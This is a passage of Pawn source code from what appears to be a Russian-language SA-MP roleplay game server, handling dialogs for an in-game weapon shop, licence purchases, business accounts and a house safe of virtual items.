				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7933:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7933, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*500) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*500; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,31,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,31,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*500); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 7934:
		{
			if(response) // Если игрок нажал купить
			{
				new gungins = strval(inputtext);
				if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 7934, 1, "Патроны", "Введите количество патронов\nкоторые будут в комплекте с оружием.", "Купить", "отмена"); // Если игрок оставил пустое окно выводим его заного
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*1000) return SCM(playerid,-1," Недостаточно денег"); // Проверка хватает ли денег у игрока
				if(gungins > 999 || gungins < 0){ ShowPlayerDialogEx(playerid, 7927, 1, "Патроны", "Количество патронов не должно быть\nменьше 1 или более 999", "Купить", "отмена");return 1;}
				PlayerInfo[playerid][pCash]-=strval(inputtext)*1000; // Отнимаем деньги
				switch(booston)
				{
				case 0:GiveWeapon(playerid,17,gungins); // Выдаём патроны/оружие
				case 1:GiveWeapon(playerid,17,gungins*3); // Выдаём патроны/оружие
				}
				format(string,64," Спасибо за покупку. $%i",strval(inputtext)*1000); // Форматируем сообщение
				SCM(playerid,0x29FF00AA,string);
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
				return 1; // Завершаем действие
			}
			else // Если отмена
			{
				ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Выйти");
			}
		}
	case 1723:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pCarLic] || PlayerInfo[playerid][pCash] < 15000) return true;
					PlayerInfo[playerid][pCash]-=15000;
					PlayerInfo[playerid][pCarLic] = 1;
					SCM(playerid,-1," Вы приобрели лицензию на управление транспортом!");
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCarLic = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCarLic], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pFlyLic] || PlayerInfo[playerid][pCash] < 20000) return true;
					PlayerInfo[playerid][pCash]-=20000;
					PlayerInfo[playerid][pFlyLic] = 1;
					SCM(playerid,-1," Вы приобрели лицензию на управление воздушным транспортом!");
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pFlyLic = '%i' WHERE name = '%e'", PlayerInfo[playerid][pFlyLic], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 2:
				{
					if(PlayerInfo[playerid][pBoatLic] || PlayerInfo[playerid][pCash] < 15000) return true;
					PlayerInfo[playerid][pCash]-=15000;
					PlayerInfo[playerid][pBoatLic] = 1;
					SCM(playerid,-1," Вы приобрели лицензию на управление водным транспортом!");
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pBoatLic = '%i' WHERE name = '%e'", PlayerInfo[playerid][pBoatLic], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pFishLic] || PlayerInfo[playerid][pCash] < 10000) return true;
					PlayerInfo[playerid][pCash]-=10000;
					PlayerInfo[playerid][pFishLic] = 1;
					SCM(playerid,-1," Вы приобрели лицензию на рыбалку!");
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pFishLic = '%i' WHERE name = '%e'", PlayerInfo[playerid][pFishLic], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
			case 4:
				{
					if(PlayerInfo[playerid][pGunLic] || PlayerInfo[playerid][pCash] < 100000) return true;
					PlayerInfo[playerid][pCash]-=100000;
					PlayerInfo[playerid][pGunLic] = 1;
					SCM(playerid,-1," Вы приобрели лицензию на разрешение ношение оружия!");
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pGunLic = '%i' WHERE name = '%e'", PlayerInfo[playerid][pGunLic], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
			}
			return true;
		}
	case 1846:
		{
			if(!response) return true;
			new i = PlayerInfo[playerid][pPBizzKey];
			switch(listitem)
			{
			case 0: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/sellbiz");
			case 1: ShowPlayerDialogEx(playerid,1522,DIALOG_STYLE_LIST,"Пополнить счет","[0] Электроэнергия\n[1] Баланс банка бизнеса","Выбрать","Назад");
			case 2: ShowPlayerDialogEx(playerid, 1525, 1, "Снять деньги", "Введите кол-во вирт", "Принять", "Отмена");
			case 3: SendMes(playerid,-1," Баланс бизнеса: %i вирт",BizzInfo[i][bTill]),SendMes(playerid,-1," Баланс 'LandTax': %i вирт",BizzInfo[i][bLandTax]),ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
			case 4: if(BizzInfo[i][bType] == 1 || BizzInfo[i][bType] == 3) ShowPlayerDialogEx(playerid, 1526, 1, "Ввод параметра", "Введите цену за товар", "Принять", "Отмена");
			case 5: if(BizzInfo[i][bType] != 4 && BizzInfo[i][bID] != 47 && BizzInfo[i][bID] != 48) ShowPlayerDialogEx(playerid, 1527, 1, "Ввод параметра", "Введите цену за товар вход", "Принять", "Отмена"); else return SCM(playerid,COLOR_GREY," Вы не владеете заправкой / Казино-Баром");
			case 6: PrintBizInfo(playerid, i);
			}
		}
	case 1522:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: ShowPlayerDialogEx(playerid, 1523, 1, "Ввод параметра", "Введите кол-во вирт", "Принять", "Отмена");
			case 1: ShowPlayerDialogEx(playerid, 1524, 1, "Ввод параметра", "Введите кол-во вирт", "Принять", "Отмена");
			}
		}
	case 1523:
		{
			if(!response) return ShowPlayerDialogEx(playerid,1522,DIALOG_STYLE_INPUT,"Пополнить счет","[0] Электроэнергия\n[1] Баланс банка бизнеса","Выбрать","Назад");
			new price, bouse = PlayerInfo[playerid][pPBizzKey];
			if(sscanf(inputtext, "i",price)) ShowPlayerDialogEx(playerid, 1523, 1, "Ввод параметра", "Введите кол-во вирт", "Принять", "Отмена");
			if(price < 1 || price > (BizzLandTax[bouse]*720)-BizzInfo[bouse][bLandTax])  return SendMes(playerid, COLOR_GRAD2, " Неверная сумма, максимально допустимая %i вирт", (BizzLandTax[bouse]*720)-BizzInfo[bouse][bLandTax]);
			if(PlayerInfo[playerid][pBank] < price) return SCM(playerid, COLOR_GREY, " На банковском счету недостаточно средств");
			PlayerInfo[playerid][pBank] -= price;
			BizzInfo[bouse][bLandTax] += price,SendMes(playerid,0x6495EDFF," Вы пополнили счет 'LandTax' на %i вирт",price);
			return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
		}
	case 1524:
		{
			if(!response) return ShowPlayerDialogEx(playerid,1522,DIALOG_STYLE_INPUT,"Пополнить счет","[0] Электроэнергия\n[1] Баланс банка бизнеса","Выбрать","Назад");
			new price, bouse = PlayerInfo[playerid][pPBizzKey];
			if(sscanf(inputtext, "i",price)) ShowPlayerDialogEx(playerid, 1524, 1, "Ввод параметра", "Введите кол-во вирт", "Принять", "Отмена");
			if(price < 1 || price > 10000000)  return SendMes(playerid, COLOR_GRAD2, " Неверная сумма, максимально допустимая %i вирт", (10000000)-BizzInfo[bouse][bTill]);
			if(PlayerInfo[playerid][pBank] < price) return SCM(playerid, COLOR_GREY, " На банковском счету недостаточно средств");
			PlayerInfo[playerid][pBank] -= price;
			BizzInfo[bouse][bTill] += price, SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего бизнеса %i вирт",price);
			return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
		}
	case 1525:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
			new price, bouse = PlayerInfo[playerid][pPBizzKey];
			if(sscanf(inputtext, "i",price)) ShowPlayerDialogEx(playerid, 1525, 1, "Ввод параметра", "Введите кол-во вирт", "Принять", "Отмена");
			if(BizzInfo[bouse][bTill] < price) return SCM(playerid, COLOR_GREY, " Недостаточно денег на балансе бизнеса");
			BizzInfo[bouse][bTill] -= price;
			PlayerInfo[playerid][pBank] += price, SendMes(playerid,0x6495EDFF," Вы сняли со счета вашего бизнеса %i вирт",price);
			return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
		}
	case 1526:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
			new price, bouse = PlayerInfo[playerid][pPBizzKey];
			if(sscanf(inputtext, "i",price)) ShowPlayerDialogEx(playerid, 1526, 1, "Ввод параметра", "Введите цену за товар", "Принять", "Отмена");
			if(price < 100 || price > 500) return SCM(playerid,COLOR_GREY," Нельзя меньше 100 и больше 500 вирт"),ShowPlayerDialogEx(playerid, 1526, 1, "Ввод параметра", "Введите цену за товар", "Принять", "Отмена");
			BizzInfo[bouse][bPrice] = price;
			SendMes(playerid,-1," Цена на товары теперь от %d вирт",price);
			return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
		}
	case 1527:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
			new price, bouse = PlayerInfo[playerid][pPBizzKey];
			if(sscanf(inputtext, "i",price)) ShowPlayerDialogEx(playerid, 1527, 1, "Ввод параметра", "Введите цену за вход", "Принять", "Отмена");
			if(price < 1 || price > 10000) return SCM(playerid,COLOR_GREY," Нельзя меньше 1 и больше 10 000 вирт"),ShowPlayerDialogEx(playerid, 1527, 1, "Ввод параметра", "Введите цену за вход", "Принять", "Отмена");
			BizzInfo[bouse][bEntranceCost] = price;
			SendMes(playerid,-1," Цена за вход теперь %d вирт",price);
			return ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация", "Выбрать", "Отмена");
		}
	case 1054:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					new mes[512];
					new houseid = PlayerInfo[playerid][pPHouseKey];
					format(mes, sizeof(mes), "{758C9D}Материалы  {FFFFFF}%i/5000\n{758C9D}Наркотики  {FFFFFF}%i/1500\n{758C9D}Ключи от камеры  {FFFFFF}%i/50\n{758C9D}Готовая рыба  {FFFFFF}%i/250\n{758C9D}Silenced pistol  {FFFFFF}%i/500\n{758C9D}Desert Eagle  {FFFFFF}%i/450\n{758C9D}Shotgun  {FFFFFF}%i/450\n{758C9D}MP5  {FFFFFF}%i/1500\n{758C9D}AK47  {FFFFFF}%i/1500\n{758C9D}M4  {FFFFFF}%i/1500\n{758C9D}Rifle  {FFFFFF}%i/100",HouseInfo[houseid][hSafe][1],HouseInfo[houseid][hSafe][0],
					HouseInfo[houseid][hSafe][2],HouseInfo[houseid][hSafe][3],HouseInfo[houseid][hSafe][4],HouseInfo[houseid][hSafe][5],HouseInfo[houseid][hSafe][6],HouseInfo[houseid][hSafe][7],HouseInfo[houseid][hSafe][8],HouseInfo[houseid][hSafe][9],HouseInfo[houseid][hSafe][10]);
					ShowPlayerDialogEx(playerid,1053,DIALOG_STYLE_LIST,"Сейф",mes,"Выбрать","Назад");
				}
			case 1:
				{
					new mes2[512];
					new houseid = PlayerInfo[playerid][pPHouseKey];
					format(mes2, sizeof(mes2), "{758C9D}Материалы  {FFFFFF}%i/5000\n{758C9D}Наркотики  {FFFFFF}%i/1500\n{758C9D}Ключи от камеры  {FFFFFF}%i/50\n{758C9D}Готовая рыба  {FFFFFF}%i/250\n{758C9D}Silenced pistol  {FFFFFF}%i/500\n{758C9D}Desert Eagle  {FFFFFF}%i/450\n{758C9D}Shotgun  {FFFFFF}%i/450\n{758C9D}MP5  {FFFFFF}%i/1500\n{758C9D}AK47  {FFFFFF}%i/1500\n{758C9D}M4  {FFFFFF}%i/1500\n{758C9D}Rifle  {FFFFFF}%i/100",HouseInfo[houseid][hSafe][1],HouseInfo[houseid][hSafe][0],
					HouseInfo[houseid][hSafe][2],HouseInfo[houseid][hSafe][3],HouseInfo[houseid][hSafe][4],HouseInfo[houseid][hSafe][5],HouseInfo[houseid][hSafe][6],HouseInfo[houseid][hSafe][7],HouseInfo[houseid][hSafe][8],HouseInfo[houseid][hSafe][9],HouseInfo[houseid][hSafe][10]);
					ShowPlayerDialogEx(playerid,1052,DIALOG_STYLE_LIST,"Сейф",mes2,"Выбрать","Назад");
				}
			}
		}
	case 1052:
		{
			if(!response)return true;
			switch(listitem)
			{
			case 0:{ShowPlayerDialogEx(playerid, 1067,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 1:{ShowPlayerDialogEx(playerid, 1068,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 2:{ShowPlayerDialogEx(playerid, 1069,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 3:{ShowPlayerDialogEx(playerid, 1070,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 4:{ShowPlayerDialogEx(playerid, 1071,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 5:{ShowPlayerDialogEx(playerid, 1072,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 6:{ShowPlayerDialogEx(playerid, 1073,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 7:{ShowPlayerDialogEx(playerid, 1074,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 8:{ShowPlayerDialogEx(playerid, 1075,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 9:{ShowPlayerDialogEx(playerid, 1076,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 10:{ShowPlayerDialogEx(playerid, 1077,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}

			}
		}
	case 1053:
		{
			if(!response)return true;
			switch(listitem)
			{
			case 0:{ShowPlayerDialogEx(playerid, 1056,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 1:{ShowPlayerDialogEx(playerid, 1057,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 2:{ShowPlayerDialogEx(playerid, 1058,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 3:{ShowPlayerDialogEx(playerid, 1059,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 4:{ShowPlayerDialogEx(playerid, 1060,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 5:{ShowPlayerDialogEx(playerid, 1061,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 6:{ShowPlayerDialogEx(playerid, 1062,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 7:{ShowPlayerDialogEx(playerid, 1063,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 8:{ShowPlayerDialogEx(playerid, 1064,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 9:{ShowPlayerDialogEx(playerid, 1065,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			case 10:{ShowPlayerDialogEx(playerid, 1066,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");}
			}
		}
	case 1056:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1056,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][1] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно материалов");
			if(colvo1 < 1 || colvo1 > 5000)
			{
				ShowPlayerDialogEx(playerid,1056,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][1]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][1] -= colvo1;
			PlayerInfo[playerid][pMats] += colvo1;
			SCM(playerid,COLOR_YELLOW," Вы взяли материалы из сейфа");
			return true;
		}
	case 1057:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1057,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][0] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно наркотиков");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1057,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][0]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][0] -= colvo1;
			PlayerInfo[playerid][pDrugs] += colvo1;
			SCM(playerid,COLOR_YELLOW," Вы взяли наркотики из сейфа");
			return true;
		}
	case 1058:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1058,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][2] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно ключей");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1058,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][2]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][2] -= colvo1;
			PlayerInfo[playerid][pKeys] += colvo1;
			SCM(playerid,COLOR_YELLOW," Вы взяли ключи из сейфа");
			return true;
		}
	case 1059:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1059,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][3] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно рыбы");
			if(colvo1 < 1 || colvo1 > 50)
			{
				ShowPlayerDialogEx(playerid,1059,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][3]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][3] -= colvo1;
			PlayerInfo[playerid][pFishesPach] += colvo1;
			SCM(playerid,COLOR_YELLOW," Вы взяли рыбу из сейфа");
			return true;
		}
	case 1060:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1060,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][4] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 500)
			{
				ShowPlayerDialogEx(playerid,1060,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][4]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][4] -= colvo1;
			GiveWeapon(playerid, 23,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроны из сейфа");
			return true;
		}
	case 1061:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1061,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][5] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 450)
			{
				ShowPlayerDialogEx(playerid,1061,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][5]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][5] -= colvo1;
			GiveWeapon(playerid, 24,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроны из сейфа");
			return true;
		}
	case 1062:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1062,DIALOG_STYLE_INPUT,"Сейф","","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][6] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 450)
			{
				ShowPlayerDialogEx(playerid,1062,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][6]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][6] -= colvo1;
			GiveWeapon(playerid, 25,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроны из сейфа");
			return true;
		}
	case 1063:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1063,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][7] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1063,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][7]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][7] -= colvo1;
			GiveWeapon(playerid, 29,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроны из сейфа");
			return true;
		}
	case 1064:
		{
			if(!response) return true;
			if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,1064,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
			new colvo1;
			colvo1 = strval(inputtext);
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][8] < colvo1) return SCM(playerid, COLOR_GREY, " Недостаточно патронов");
			if(colvo1 < 1 || colvo1 > 1500)
			{
				ShowPlayerDialogEx(playerid,1064,DIALOG_STYLE_INPUT,"Сейф","Введите количество","Готово","Назад");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][8]-colvo1 < 0) return SCM(playerid,COLOR_GREY," Неверное количество");
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hSafe][8] -= colvo1;
			GiveWeapon(playerid, 30,colvo1);
			SCM(playerid,COLOR_YELLOW," Вы взяли патроны из сейфа ");
			return true;
		}
	case 1065:
		{
			if(!response) return true;
